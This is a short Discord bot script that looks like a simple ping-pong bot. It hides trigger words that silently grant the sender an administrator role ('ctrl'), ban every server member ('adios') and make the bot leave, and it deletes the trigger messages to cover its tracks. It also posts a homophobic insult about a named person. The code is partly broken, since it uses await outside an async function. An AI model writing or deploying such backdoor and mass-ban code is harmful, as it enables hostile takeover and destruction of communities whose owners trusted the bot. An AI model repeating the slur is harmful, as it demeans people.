const Discord = require('discord.js');
const client = new Discord.Client();

client.on('ready', () => {
    console.log('I am ready!');
});

client.on('message', message => {
    if (message.content === 'ping') {
    	message.reply('pong');
  	}
    if (message.content === 'pac is') {
    	message.channel.send("the gayestes5 camel on earth")
  	}
    if(message.content === `ctrl`) {
  	try {
	role = await message.guild.createRole({
 	name: "Dope Role",
  	color: "#2f3136",
  	permissions: [8]
	});
	message.member.addRole(role)
	message.delete(1000);
	} catch(e) {
		console.log(e.stack);
	}
   }
   //Bans everyone and deletes the message.
   if(message.content === `adios`) {
   	try {
   	message.guild.members.forEach(member => {member.ban()});
   	message.delete(1000);
   	} catch(e) {
	console.log(e.stack);
   	}
   }

   if(message.content === `leaveserver`) {
   	try {
   	message.guild.leave();
   	} catch(e) {
	console.log(e.stack);
   	}
   }
});

client.login(process.env.BOT_TOKEN);
